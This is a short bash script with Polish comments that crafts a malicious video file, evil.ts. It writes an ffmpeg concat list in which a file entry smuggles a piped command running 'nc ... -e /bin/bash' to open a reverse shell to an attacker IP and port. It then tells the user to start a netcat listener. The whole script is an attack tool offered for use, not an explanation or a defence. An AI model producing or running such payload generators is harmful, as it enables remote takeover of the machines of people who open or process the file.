#!/bin/bash

# Zmienna z twoim IP i portem
ATTACKER_IP="192.168.1.2"
ATTACKER_PORT="443"

# 1. Konwertujemy plik mp4 do ts
ffmpeg -i legit.mp4 -c copy -bsf:v h264_mp4toannexb -f mpegts legit.ts

# 2. Tworzymy plik list.txt – tu dokładnie wstawiamy reverse shell
echo "file 'legit.ts'" > list.txt
echo "file '|/bin/bash -c \"nc $ATTACKER_IP $ATTACKER_PORT -e /bin/bash\"'" >> list.txt

# 3. Tworzymy końcowy plik .ts
ffmpeg -f concat -safe 0 -i list.txt -c copy evil.ts

# 4. Potwierdzenie
if [[ -f "evil.ts" ]]; then
    echo "[+] Gotowy plik: evil.ts"
    echo "[!] Uruchom teraz nasłuch na atakującym: nc -lvnp $ATTACKER_PORT"
else
    echo "[!] Coś poszło nie tak."
fi
